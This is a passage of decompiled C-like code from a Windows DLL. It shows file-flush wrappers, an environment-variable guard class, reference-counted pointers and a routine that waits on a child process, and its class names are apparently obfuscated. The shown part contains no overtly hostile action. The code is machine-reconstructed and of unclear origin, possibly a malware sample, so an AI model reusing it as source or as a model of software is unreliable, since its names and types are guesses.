  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-10h] BYREF

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    sub_10027D57(pExceptionObject);
    v3 = (_ThrowInfo *)&_TI5_AVCsszWkelsgXqduhacss_jhzi_sr__;
    goto LABEL_3;
  }
  result = FlushFileBuffers(this[1]);
  if ( !result )
  {
    sub_10027B8C(pExceptionObject, 1);
LABEL_3:
    _CxxThrowException(pExceptionObject, v3);
  }
  return result;
}
// 100128A3: variable 'v3' is possibly undefined
// 1001287F: using guessed type _DWORD pExceptionObject[4];

//----- (100128CA) --------------------------------------------------------
BOOL __thiscall sub_100128CA(HANDLE *this)
{
  BOOL result; // eax
  _ThrowInfo *v3; // [esp-4h] [ebp-18h]
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-10h] BYREF

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    sub_10027D57(pExceptionObject);
    v3 = (_ThrowInfo *)&_TI5_AVCsszWkelsgXqduhacss_jhzi_sr__;
    goto LABEL_3;
  }
  result = SetEndOfFile(this[1]);
  if ( !result )
  {
    sub_10027B8C(pExceptionObject, 1);
LABEL_3:
    _CxxThrowException(pExceptionObject, v3);
  }
  return result;
}
// 100128EE: variable 'v3' is possibly undefined
// 100128CA: using guessed type _DWORD pExceptionObject[4];

//----- (10012915) --------------------------------------------------------
void __thiscall __noreturn sub_10012915(void *this)
{
  void *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  sub_100165E5(&pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVGfnpwoMadjdwvkl_sr__);
}

//----- (10012981) --------------------------------------------------------
_DWORD *__usercall sub_10012981@<eax>(_DWORD *a1@<esi>)
{
  *a1 = off_10093C34;
  a1[1] = _set_new_handler((int (__cdecl *)(unsigned int))sub_10012915);
  a1[2] = _set_new_mode(1);
  return a1;
}
// 1004E88F: using guessed type _DWORD __cdecl _set_new_mode(_DWORD);
// 1004E8D9: using guessed type int (__cdecl *__cdecl _set_new_handler(int (__cdecl *)(unsigned int)))(unsigned int);
// 10093C34: using guessed type int (__thiscall *off_10093C34[4])(void *Block, char);

//----- (100129A3) --------------------------------------------------------
int (__cdecl **__thiscall sub_100129A3(int (__cdecl **Block)(unsigned int), char a2))(unsigned int)
{
  sub_100129C2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100129C2) --------------------------------------------------------
int __thiscall sub_100129C2(int (__cdecl **this)(unsigned int))
{
  *this = (int (__cdecl *)(unsigned int))off_10093C34;
  _set_new_handler(this[1]);
  return _set_new_mode(this[2]);
}
// 1004E88F: using guessed type _DWORD __cdecl _set_new_mode(_DWORD);
// 1004E8D9: using guessed type int (__cdecl *__cdecl _set_new_handler(int (__cdecl *)(unsigned int)))(unsigned int);
// 10093C34: using guessed type int (__thiscall *off_10093C34[4])(void *Block, char);

//----- (10012A00) --------------------------------------------------------
_DWORD *__stdcall sub_10012A00(_DWORD *a1, wchar_t *a2)
{
  sub_1000CC20(a1, a2);
  *a1 = off_10093C38;
  return a1;
}
// 10093C38: using guessed type int (__thiscall *off_10093C38[3])(void *Block, char);

//----- (10012A30) --------------------------------------------------------
int *__thiscall sub_10012A30(int *Block, char a2)
{
  sub_10012AAC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10012A4F) --------------------------------------------------------
_DWORD *__userpurge sub_10012A4F@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_1000CC90(a1, a2);
  *a2 = off_10093C38;
  return a2;
}
// 10093C38: using guessed type int (__thiscall *off_10093C38[3])(void *Block, char);

//----- (10012A7C) --------------------------------------------------------
_DWORD *__stdcall sub_10012A7C(_DWORD *a1, int a2)
{
  sub_1000CE26(a1, a2);
  *a1 = off_10093C38;
  return a1;
}
// 10093C38: using guessed type int (__thiscall *off_10093C38[3])(void *Block, char);

//----- (10012AAC) --------------------------------------------------------
LONG __thiscall sub_10012AAC(int *this)
{
  *this = (int)off_10093C38;
  return sub_1000CE59(this);
}
// 10093C38: using guessed type int (__thiscall *off_10093C38[3])(void *Block, char);

//----- (10012AD0) --------------------------------------------------------
_DWORD *__stdcall sub_10012AD0(_DWORD *a1, int a2, int a3)
{
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-18h] BYREF

  *a1 = off_10093C3C;
  sub_1000CE26(a1 + 1, a2);
  pExceptionObject[5] = 0;
  if ( !SetEnvironmentVariableW(*(LPCWSTR *)(a1[2] + 12), *(LPCWSTR *)(*(_DWORD *)(a3 + 4) + 12)) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return a1;
}
// 10093C3C: using guessed type int (__thiscall *off_10093C3C[2])(void *Block, char);

//----- (10012B36) --------------------------------------------------------
LONG __thiscall sub_10012B36(int *this)
{
  *this = (int)off_10093C3C;
  SetEnvironmentVariableW(*(LPCWSTR *)(this[2] + 12), 0);
  return sub_1000CE59(this + 1);
}
// 10093C3C: using guessed type int (__thiscall *off_10093C3C[2])(void *Block, char);

//----- (10012B88) --------------------------------------------------------
int *__thiscall sub_10012B88(int *Block, char a2)
{
  sub_10012B36(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10012BA7) --------------------------------------------------------
int __usercall sub_10012BA7@<eax>(int a1@<ebx>)
{
  wchar_t *v1; // eax
  int v2; // eax
  wchar_t *v3; // eax
  int v4; // eax
  wchar_t *v5; // eax
  int v6; // eax
  wchar_t *v7; // eax
  int v8; // eax
  int *v9; // eax
  int v11; // [esp+Ch] [ebp-50h] BYREF
  int v12; // [esp+10h] [ebp-4Ch] BYREF
  int v13[2]; // [esp+14h] [ebp-48h] BYREF
  int v14[3]; // [esp+1Ch] [ebp-40h] BYREF
  int v15[3]; // [esp+28h] [ebp-34h] BYREF
  int v16[3]; // [esp+34h] [ebp-28h] BYREF
  int v17[4]; // [esp+40h] [ebp-1Ch] BYREF
  int v18; // [esp+58h] [ebp-4h]

  if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) )
  {
    v1 = (wchar_t *)sub_1000E943((int)&unk_100B80EC);
    sub_1000CC20(&v11, v1);
    v18 = 0;
    sub_100281F2(v13);
    LOBYTE(v18) = 1;
    sub_10012AD0(v17, (int)&v11, v2);
    LOBYTE(v18) = 3;
    sub_1000CE59(v13);
    LOBYTE(v18) = 4;
    sub_1000CE59(&v11);
    v3 = (wchar_t *)sub_1000E943((int)&unk_100B8124);
    sub_1000CC20(&v11, v3);
    LOBYTE(v18) = 5;
    sub_100280EC(v13);
    LOBYTE(v18) = 6;
    sub_10012AD0(v16, (int)&v11, v4);
    LOBYTE(v18) = 8;
    sub_1000CE59(v13);
    LOBYTE(v18) = 9;
    sub_1000CE59(&v11);
    v5 = (wchar_t *)sub_1000E943((int)&unk_100B7F4C);
    sub_1000CC20(&v11, v5);
    LOBYTE(v18) = 10;
    sub_10028289(v13);
    LOBYTE(v18) = 11;
    sub_10012AD0(v15, (int)&v11, v6);
    LOBYTE(v18) = 13;
    sub_1000CE59(v13);
    LOBYTE(v18) = 14;
    sub_1000CE59(&v11);
    v7 = (wchar_t *)sub_1000E943((int)&unk_100B8164);
    sub_1000CC20(&v11, v7);
    LOBYTE(v18) = 15;
    sub_10028320(v13);
    LOBYTE(v18) = 16;
    sub_10012AD0(v14, (int)&v11, v8);
    LOBYTE(v18) = 18;
    sub_1000CE59(v13);
    LOBYTE(v18) = 19;
    sub_1000CE59(&v11);
    v9 = sub_100285B2(v13, a1);
    LOBYTE(v18) = 20;
    sub_10012A7C(&v11, (int)v9);
    LOBYTE(v18) = 21;
    sub_10002C25(&v12, (int *)(a1 + 4));
    LOBYTE(v18) = 20;
    sub_10012AAC(&v11);
    LOBYTE(v18) = 19;
    sub_1000CE59(v13);
    LOBYTE(v18) = 14;
    sub_10012B36(v14);
    LOBYTE(v18) = 9;
    sub_10012B36(v15);
    LOBYTE(v18) = 4;
    sub_10012B36(v16);
    v18 = -1;
    sub_10012B36(v17);
  }
  return a1;
}
// 10012C16: variable 'v2' is possibly undefined
// 10012C69: variable 'v4' is possibly undefined
// 10012CBC: variable 'v6' is possibly undefined
// 10012D0F: variable 'v8' is possibly undefined
// 10012BA7: using guessed type int var_1C[4];
// 10012BA7: using guessed type int var_28[3];
// 10012BA7: using guessed type int var_34[3];
// 10012BA7: using guessed type int var_40[3];

//----- (10012DD3) --------------------------------------------------------
_DWORD *__stdcall sub_10012DD3(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10093C40;
  return a1;
}
// 10093C40: using guessed type int (__thiscall *off_10093C40)(void *Block, char);

//----- (10012E01) --------------------------------------------------------
void __thiscall sub_10012E01(_DWORD *this)
{
  *this = &off_10093C40;
  sub_1001646C(this);
}
// 10093C40: using guessed type int (__thiscall *off_10093C40)(void *Block, char);

//----- (10012E25) --------------------------------------------------------
_DWORD *__thiscall sub_10012E25(_DWORD *Block, char a2)
{
  sub_10012E01(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10012E44) --------------------------------------------------------
BOOL __stdcall sub_10012E44(int a1)
{
  return !sub_10014F97(a1);
}

//----- (10012E5A) --------------------------------------------------------
_DWORD *__stdcall sub_10012E5A(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10093C50;
  return a1;
}
// 10093C50: using guessed type int (__thiscall *off_10093C50)(void *Block, char);

//----- (10012E88) --------------------------------------------------------
_DWORD *__thiscall sub_10012E88(_DWORD *Block, char a2)
{
  sub_10012EA7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10012EA7) --------------------------------------------------------
void __thiscall sub_10012EA7(_DWORD *this)
{
  *this = &off_10093C50;
  sub_1001646C(this);
}
// 10093C50: using guessed type int (__thiscall *off_10093C50)(void *Block, char);

//----- (10012ECB) --------------------------------------------------------
int __stdcall sub_10012ECB(int a1, int a2, int a3, int a4, int a5, _DWORD *a6, _DWORD *a7, void *Block)
{
  int *v8; // eax
  int v10[2]; // [esp+38h] [ebp-38h] BYREF
  int v11; // [esp+4Ch] [ebp-24h] BYREF
  int v12; // [esp+50h] [ebp-20h] BYREF
  int v13; // [esp+6Ch] [ebp-4h]

  *(_DWORD *)a1 = &off_10093C58;
  sub_1000CE26((_DWORD *)(a1 + 4), a2);
  v13 = 0;
  sub_1000CE26((_DWORD *)(a1 + 12), (int)&unk_100BF588);
  sub_1000CE26((_DWORD *)(a1 + 20), a3);
  sub_100141F3((int *)(a1 + 28), a4);
  *(_DWORD *)(a1 + 40) = -1;
  sub_1000CE26((_DWORD *)(a1 + 44), a5);
  sub_1000E9E2((_DWORD *)(a1 + 52), 0, 0);
  sub_10013813((_DWORD *)(a1 + 64));
  sub_10016AE9(a6, a1 + 72);
  *(_BYTE *)(a1 + 92) = (_BYTE)Block;
  sub_10013891((_DWORD *)(a1 + 93));
  *(_DWORD *)(a1 + 101) = 0;
  sub_10013770((_DWORD *)(a1 + 105));
  sub_10013770((_DWORD *)(a1 + 114));
  LOBYTE(v13) = 11;
  sub_100135A3(a7, &v11);
  LOBYTE(v13) = 12;
  sub_100137E8((_DWORD *)(a1 + 105), &v12);
  if ( !*(_DWORD *)(a1 + 84) )
  {
    v8 = (int *)sub_10016983((void *)(*(_DWORD *)(v12 + 12) + 8), (int)v10, a7);
    LOBYTE(v13) = 13;
    sub_10016B2F(v8, a1 + 72);
    LOBYTE(v13) = 12;
    sub_10016B53(v10);
  }
  LOBYTE(v13) = 11;
  sub_1001312A((int)&v11);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10093C58: using guessed type int (__thiscall *off_10093C58)(void *Block, char);

//----- (1001310B) --------------------------------------------------------
void *__thiscall sub_1001310B(void *Block, char a2)
{
  sub_1001314D((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001312A) --------------------------------------------------------
void __stdcall sub_1001312A(int a1)
{
  sub_100137AB((void *)(a1 + 4));
}

//----- (1001314D) --------------------------------------------------------
LONG __thiscall sub_1001314D(int this)
{
  *(_DWORD *)this = &off_10093C58;
  if ( *(_BYTE *)(this + 92) == 1 )
    sub_10013219((_DWORD *)this);
  sub_100137AB((void *)(this + 114));
  sub_100137AB((void *)(this + 105));
  sub_100138CC((void *)(this + 93));
  sub_10016B53((int *)(this + 72));
  sub_1001384E((void *)(this + 64));
  sub_1000EA34((int *)(this + 52));
  sub_1000CE59((int *)(this + 44));
  sub_100141CF((int *)(this + 28));
  sub_1000CE59((int *)(this + 20));
  sub_1000CE59((int *)(this + 12));
  return sub_1000CE59((int *)(this + 4));
}
// 10093C58: using guessed type int (__thiscall *off_10093C58)(void *Block, char);

//----- (10013219) --------------------------------------------------------
void __stdcall sub_10013219(_DWORD *a1)
{
  int v1; // eax

  v1 = a1[16];
  if ( v1 && *(_BYTE *)(v1 + 40) )
  {
    if ( sub_10012E44(*(_DWORD *)((char *)a1 + 93)) )
    {
      (*(void (__thiscall **)(_DWORD *))(a1[7] + 16))(a1 + 7);
      sub_10014E23((int)(a1 + 13), 30000, 0);
      sub_1001B18B(a1[16]);
    }
  }
}

//----- (10013290) --------------------------------------------------------
_DWORD *__stdcall sub_10013290(int a1, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  int v5; // eax
  int *v6; // ebx
  _DWORD *v7; // eax
  int v8; // eax
  int v9; // ebx
  int v10; // esi
  int v11; // ebx
  char v12; // [esp-2Ch] [ebp-94h] BYREF
  int v13; // [esp-28h] [ebp-90h]
  int v14; // [esp-24h] [ebp-8Ch]
  int v15; // [esp-20h] [ebp-88h]
  int v16; // [esp-1Ch] [ebp-84h]
  int v17; // [esp-18h] [ebp-80h]
  int v18; // [esp-14h] [ebp-7Ch]
  int v19; // [esp-10h] [ebp-78h]
  int v20; // [esp-Ch] [ebp-74h]
  int v21; // [esp-8h] [ebp-70h]
  int v22; // [esp-4h] [ebp-6Ch]
  _DWORD v23[11]; // [esp+10h] [ebp-58h] BYREF
  int v24[3]; // [esp+3Ch] [ebp-2Ch] BYREF
  int pExceptionObject; // [esp+48h] [ebp-20h] BYREF
  int v26; // [esp+4Ch] [ebp-1Ch] BYREF
  void *Block; // [esp+50h] [ebp-18h]
  int v28; // [esp+54h] [ebp-14h]
  int v29; // [esp+64h] [ebp-4h]

  v28 = 0;
  if ( sub_10014F97(a1 + 28) || sub_1001422C(a1 + 20) )
    goto LABEL_2;
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 56) + 16) )
  {
    Block = (void *)(*(int (__thiscall **)(int))(*(_DWORD *)(a1 + 52) + 16))(a1 + 52);
    if ( Block == (void *)259 )
    {
LABEL_2:
      sub_1000E9E2(a2, 0, 0);
      v29 = 0;
      v28 = 1;
      return a2;
    }
    if ( sub_10012E44(*(_DWORD *)(a1 + 93)) )
      sub_1001B18B(*(_DWORD *)(a1 + 64));
    if ( Block == (void *)888 )
    {
      sub_10012E5A(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVVkleVkdoghmczMqygvklev_vwfp_qlp_pqesih_sr__);
    }
  }
  v29 = 2;
  v3 = operator new(0xCu);
  Block = v3;
  if ( v3 )
    v4 = sub_100227BB(v3, a1 + 4);
  else
    v4 = 0;
  sub_100138F7((int)v4, (_DWORD *)(a1 + 93));
  Sleep(0x4E20u);
  Block = operator new(0x2Cu);
  v29 = 6;
  if ( Block )
    v5 = sub_1001A9C7(*(_DWORD **)(a1 + 105), *(_DWORD *)(a1 + 93), (int)Block);
  else
    v5 = 0;
  LOBYTE(v29) = 0;
  v6 = (int *)(a1 + 64);
  sub_1001398C((_DWORD *)(a1 + 64), v5);
  v7 = sub_1000CC20(&v26, word_100B7EAC);
  v29 = 7;
  sub_1001AB69(*(_DWORD *)(a1 + 64), (int)v7, *(_DWORD *)(a1 + 101));
  LOBYTE(v29) = 0;
  sub_1000CE59(&v26);
  v8 = *(_DWORD *)(a1 + 84);
  if ( v8 )
  {
    (*(void (__thiscall **)(_DWORD, _DWORD *, int, int, int))(**(_DWORD **)(a1 + 93) + 44))(
      *(_DWORD *)(a1 + 93),
      v23,
      v8,
      64,
      4096);
    v29 = 8;
    sub_10028BB4(v23, (_DWORD *)(a1 + 72));
    Block = &v12;
    sub_10028963(&v12, v23);
    LOBYTE(v29) = 9;
    v9 = *v6;
    LOBYTE(v29) = 8;
    sub_1001B2F6(v9, (int)v24, a1 + 44, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, v22);
    LOBYTE(v29) = 10;
    v10 = a1 + 52;
    sub_10013521();
    LOBYTE(v29) = 8;
    sub_1000EA34(v24);
    LOBYTE(v29) = 0;
    sub_10028854((int)v23);
  }
  else
  {
    Block = &v12;
    sub_100287F8((int)&v12);
    v29 = 11;
    v11 = *v6;
    LOBYTE(v29) = 0;
    sub_1001B2F6(v11, (int)v24, a1 + 44, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, v22);
    v29 = 12;
    v10 = a1 + 52;
    sub_10013521();
    LOBYTE(v29) = 0;
    sub_1000EA34(v24);
  }
  sub_1000ECB8(v10, a2);
  v29 = 0;
  v28 = 1;
  return a2;
}
// 10013521: using guessed type int sub_10013521(void);
// 10028963: using guessed type _DWORD __stdcall sub_10028963(_DWORD, _DWORD);
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100B7EAC: using guessed type wchar_t word_100B7EAC[2];
// 10013290: using guessed type _DWORD var_58[11];
// 10013290: using guessed type int var_2C[3];

//----- (10013547) --------------------------------------------------------
int __cdecl sub_10013547(void (__stdcall *a1)(int), int a2)
{
  _DWORD *v2; // ecx
  int v4[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v5; // [esp+28h] [ebp-4h]

  sub_100140E1(v2, (int)v4, 1, 0, 0);
  v5 = 1;
  a1(a2);
  v5 = -1;
  sub_100141CF(v4);
  return 555;
}
// 1001355D: variable 'v2' is possibly undefined
// 10013547: using guessed type int var_1C[6];

//----- (100135A3) --------------------------------------------------------
_DWORD *__thiscall sub_100135A3(_DWORD *this, _DWORD *a2)
{
  int *v3; // eax
  int v4; // eax
  void **v5; // edi
  void *v6; // ebx
  void *v7; // edi
  void *v8; // eax
  int v9; // eax
  int v11; // [esp+18h] [ebp-1Ch] BYREF
  int v12; // [esp+1Ch] [ebp-18h]
  _DWORD pExceptionObject[4]; // [esp+20h] [ebp-14h] BYREF
  int v14; // [esp+30h] [ebp-4h]

  v12 = 0;
  v14 = 1;
  if ( !this )
  {
    sub_10016736(pExceptionObject);
    v3 = pExceptionObject;
    goto LABEL_3;
  }
  sub_1001365C((int)a2);
  v12 = 1;
  v4 = *this;
  *a2 = *this;
  v5 = (void **)(this + 1);
  if ( !v4 )
  {
    sub_10016736(&v11);
    v3 = &v11;
LABEL_3:
    _CxxThrowException(v3, (_ThrowInfo *)&_TI2_AVKugkdNnUifqbYgkugkdnn_sr__);
  }
  v6 = *v5;
  v7 = v5 + 1;
  v8 = operator new(0x14u);
  LOBYTE(v14) = 2;
  if ( v8 )
    v9 = sub_10016983(v6, (int)v8, v7);
  else
    v9 = 0;
  sub_100137D6(v9, a2 + 1);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100135A3: using guessed type _DWORD pExceptionObject[4];

//----- (1001365C) --------------------------------------------------------
int __stdcall sub_1001365C(int a1)
{
  sub_10013770((_DWORD *)(a1 + 4));
  return a1;
}

//----- (10013681) --------------------------------------------------------
_DWORD *__stdcall sub_10013681(_DWORD *a1, _DWORD *a2)
{
  volatile LONG *v2; // ecx

  *a1 = *a2;
  v2 = (volatile LONG *)a2[2];
  a1[2] = v2;
  a1[1] = a2[1];
  InterlockedIncrement(v2);
  return a1;
}

//----- (1001371A) --------------------------------------------------------
_DWORD *__thiscall sub_1001371A(_DWORD *Block, char a2)
{
  sub_10016764(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10013739) --------------------------------------------------------
int *__usercall sub_10013739@<eax>(int *a1@<eax>, int *a2@<edi>)
{
  int v2; // eax
  int v3; // ebx

  v2 = *a1;
  v3 = *a2;
  if ( *a2 != v2 )
  {
    *a2 = v2;
    sub_1000EE1D(a2);
    if ( v3 )
      sub_10016377(v3);
  }
  return a2;
}

//----- (10013770) --------------------------------------------------------
_DWORD *__usercall sub_10013770@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100137AB) --------------------------------------------------------
void __thiscall sub_100137AB(void *this)
{
  sub_10013964((int)this);
}

//----- (100137D6) --------------------------------------------------------
_DWORD *__userpurge sub_100137D6@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_1001390F(a2, a1);
  return a2;
}

//----- (100137E8) --------------------------------------------------------
_DWORD *__usercall sub_100137E8@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_10013964((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (10013813) --------------------------------------------------------
_DWORD *__usercall sub_10013813@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001384E) --------------------------------------------------------
void __thiscall sub_1001384E(void *this)
{
  sub_100139CF((int)this);
}

//----- (10013891) --------------------------------------------------------
_DWORD *__usercall sub_10013891@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100138CC) --------------------------------------------------------
void __thiscall sub_100138CC(void *this)
{
  sub_10013A3A((int)this);
}

//----- (100138F7) --------------------------------------------------------
_DWORD *__userpurge sub_100138F7@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_100139F7(a2, a1);
  return a2;
}

//----- (1001390F) --------------------------------------------------------
void __usercall sub_1001390F(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10013964((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10013964) --------------------------------------------------------
void __usercall sub_10013964(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1001398C) --------------------------------------------------------
void __usercall sub_1001398C(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_100139CF((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100139CF) --------------------------------------------------------
void __usercall sub_100139CF(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100139F7) --------------------------------------------------------
void __usercall sub_100139F7(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10013A3A((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10013A3A) --------------------------------------------------------
void __usercall sub_10013A3A(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10013A6C) --------------------------------------------------------
int __thiscall sub_10013A6C(_DWORD *this, int a2, void *Block, int a4, int a5, int a6, int a7, volatile LONG *lpAddend)
{
  int v9; // ecx
  _DWORD *v10; // esi
  int *v11; // eax
  int *v12; // eax
  int v13; // eax
  int v15; // [esp-10h] [ebp-34h]
  int v16; // [esp-8h] [ebp-2Ch]
  volatile LONG *v17; // [esp-4h] [ebp-28h]
  volatile LONG *v18; // [esp-4h] [ebp-28h]
  int v19[4]; // [esp+10h] [ebp-14h] BYREF
  int v20; // [esp+20h] [ebp-4h]
  void *Blocka; // [esp+30h] [ebp+Ch]

  v20 = 1;
  *(_DWORD *)a2 = off_10093C84;
  sub_1000CE26((_DWORD *)(a2 + 4), (int)&a5);
  v9 = a7;
  v17 = lpAddend;
  *(_DWORD *)(a2 + 16) = lpAddend;
  *(_DWORD *)(a2 + 12) = v9;
  InterlockedIncrement(v17);
  sub_10006A72((_DWORD *)(a2 + 24), 0);
  sub_10013FBB((_DWORD *)(a2 + 32));
  sub_1001400B((_DWORD *)(a2 + 40));
  LOBYTE(v20) = 6;
  *(_DWORD *)(a2 + 56) = Block;
  *(_DWORD *)(a2 + 60) = a4;
  *(_DWORD *)(a2 + 64) = 0;
  if ( this[1] || *this )
  {
    v10 = (_DWORD *)(a2 + 48);
    *(_DWORD *)(a2 + 48) = *this;
    *(_DWORD *)(a2 + 52) = this[1];
  }
  else
  {
    v10 = (_DWORD *)(a2 + 48);
    GetSystemTimeAsFileTime((LPFILETIME)(a2 + 48));
  }
  v11 = sub_10020C61(v19, a2 + 4);
  LOBYTE(v20) = 7;
  sub_10002C25(v11 + 1, (int *)(a2 + 8));
  LOBYTE(v20) = 6;
  sub_1000CE59(v19);
  if ( sub_10020CD2(a2 + 4) )
  {
    v12 = sub_10020B59(v19, a2 + 4);
    LOBYTE(v20) = 8;
    sub_10002C25(v12 + 1, (int *)(a2 + 8));
    LOBYTE(v20) = 6;
    sub_1000CE59(v19);
  }
  Blocka = operator new(0x50u);
  LOBYTE(v20) = 9;
  if ( Blocka )
  {
    v18 = lpAddend;
    v16 = a7;
    InterlockedIncrement(lpAddend);
    LOBYTE(v20) = 10;
    v15 = *(_DWORD *)(a2 + 56);
    LOBYTE(v20) = 9;
    v13 = sub_1001058F((int)Blocka, a2 + 4, v10, v15, 3, v16, v18);
  }
  else
  {
    v13 = 0;
  }
  LOBYTE(v20) = 6;
  sub_10013F72((_DWORD *)(a2 + 24), v13);
  if ( sub_10020CD2(a2 + 4) )
  {
    sub_10013E27(a2);
    *(_BYTE *)(a2 + 20) = 1;
  }
  else
  {
    *(_BYTE *)(a2 + 20) = 0;
    sub_10013F72((_DWORD *)(a2 + 24), 0);
  }
  LOBYTE(v20) = 0;
  sub_1000CE59(&a5);
  v20 = -1;
  sub_100015D8(&a7);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10093C84: using guessed type int (*off_10093C84[5])();
// 10013A6C: using guessed type int var_14[4];

//----- (10013C13) --------------------------------------------------------
int __thiscall sub_10013C13(int this)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  if ( !*(_BYTE *)(this + 20) )
  {
    sub_10016590(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  return *(_DWORD *)(this + 32);
}
// 10013C13: using guessed type _DWORD pExceptionObject[2];

//----- (10013C3A) --------------------------------------------------------
int __thiscall sub_10013C3A(int this)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  if ( !*(_BYTE *)(this + 20) )
  {
    sub_10016590(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  return *(_DWORD *)(this + 40);
}
// 10013C3A: using guessed type _DWORD pExceptionObject[2];

//----- (10013C61) --------------------------------------------------------
int __thiscall sub_10013C61(int this)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  if ( !*(_BYTE *)(this + 20) )
  {
    sub_10016590(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 24) + 72))(*(_DWORD *)(this + 24));
}
// 10013C61: using guessed type _DWORD pExceptionObject[2];

//----- (10013C8D) --------------------------------------------------------
unsigned int __thiscall sub_10013C8D(_BYTE *this)
{
  unsigned int result; // eax
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  result = 0;
